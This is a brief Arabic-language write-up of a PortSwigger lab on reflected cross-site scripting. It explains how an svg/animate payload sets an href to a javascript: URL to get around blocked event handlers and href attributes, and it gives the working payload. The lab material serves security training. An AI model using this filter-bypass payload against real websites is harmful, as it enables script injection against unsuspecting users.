# Lab : Reflected XSS with event handlers and href attributes blocked

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked

- الفكره من ال Lab ده ان كل event معملها حظر ماعدا بعض الtags المفروض اعرف الtags  المسموح بيها واعمل كود بيعمل alert بستخدام href and click me بس الevent ده معمله حظر

```bash
1. الpayload ده مذيج بين tag ال svg الي ممكن احط جواه tag ال a و تاج الanimate الممكن انا الي اعمل attribute جديده جواه ,tag ال text الي بيخليني اعرض نص جوا tag الsvg

2. <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```
